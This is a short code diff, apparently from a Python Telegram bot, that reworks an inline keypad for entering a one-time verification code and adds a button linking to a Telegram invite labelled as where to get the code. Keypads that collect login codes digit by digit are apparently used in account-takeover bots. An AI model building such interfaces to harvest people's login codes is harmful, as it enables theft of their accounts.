@@ -62,24 +62,27 @@ strings = {
 # Inline OTP Keyboard
 OTP_KEYBOARD = InlineKeyboardMarkup([
     [
-        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
-        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
-        InlineKeyboardButton("3️⃣", callback_data="otp_3")
+        InlineKeyboardButton("ɢᴇᴛ ᴛʜᴇ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴄᴏᴅᴇ ʜᴇʀᴇ...", url="https://t.me/+42777")
     ],
     [
-        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
-        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
-        InlineKeyboardButton("6️⃣", callback_data="otp_6")
+        InlineKeyboardButton(" 1️⃣ ", callback_data="otp_1"),
+        InlineKeyboardButton(" 2️⃣ ", callback_data="otp_2"),
+        InlineKeyboardButton(" 3️⃣ ", callback_data="otp_3")
     ],
     [
-        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
-        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
-        InlineKeyboardButton("9️⃣", callback_data="otp_9")
+        InlineKeyboardButton(" 4️⃣ ", callback_data="otp_4"),
+        InlineKeyboardButton(" 5️⃣ ", callback_data="otp_5"),
+        InlineKeyboardButton(" 6️⃣ ", callback_data="otp_6")
     ],
     [
-        InlineKeyboardButton("🔙", callback_data="otp_back"),
-        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
-        InlineKeyboardButton("🆗", callback_data="otp_submit")
+        InlineKeyboardButton(" 7️⃣ ", callback_data="otp_7"),
+        InlineKeyboardButton(" 8️⃣ ", callback_data="otp_8"),
+        InlineKeyboardButton(" 9️⃣ ", callback_data="otp_9")
+    ],
+    [
+        InlineKeyboardButton(" 🔙 ", callback_data="otp_back"),
+        InlineKeyboardButton(" 0️⃣ ", callback_data="otp_0"),
+        InlineKeyboardButton(" 🆗 ", callback_data="otp_submit")
     ]
 ])
 
